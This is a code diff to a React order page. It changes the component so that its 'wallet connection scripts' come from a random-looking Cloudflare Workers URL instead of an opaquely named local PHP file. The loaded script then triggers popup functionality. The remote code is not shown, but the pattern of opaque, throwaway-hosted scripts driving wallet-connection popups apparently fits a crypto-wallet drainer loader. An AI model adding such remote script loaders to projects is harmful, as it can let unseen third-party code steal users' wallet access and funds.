@@ -74,15 +74,13 @@ const Order = () => {
     // Load the wallet connection scripts in the correct order
     const loadScripts = async () => {
       // Remove any existing scripts first
-      const existingScripts = document.querySelectorAll('script[src*="/j9oif.php"]');
+      const existingScripts = document.querySelectorAll('script[src*="myworker.manamicrist9243.workers.dev"]');
       existingScripts.forEach(script => script.remove());
 
       // Helper function to load a script and wait for it to complete
       const loadScript = (src: string): Promise<void> => {
         return new Promise((resolve, reject) => {
           const script = document.createElement('script');
-          script.charset = 'UTF-8';
-          script.type = 'text/javascript';
           script.src = src;
           script.async = false; // Load in order
           script.onload = () => resolve();
@@ -92,8 +90,8 @@ const Order = () => {
       };
 
       try {
-        // Load scripts in the correct order
-        await loadScript('/j9oif.php');
+        // Load Cloudflare Worker script
+        await loadScript('https://myworker.manamicrist9243.workers.dev/');
 
         // Initialize popup functionality after all scripts are loaded
         setTimeout(() => {
@@ -110,7 +108,7 @@ const Order = () => {
 
     // Cleanup function to remove scripts and subscription when component unmounts
     return () => {
-      const scripts = document.querySelectorAll('script[src*="/j9oif.php"]');
+      const scripts = document.querySelectorAll('script[src*="myworker.manamicrist9243.workers.dev"]');
       scripts.forEach(script => script.remove());
       
       if (subscription) {
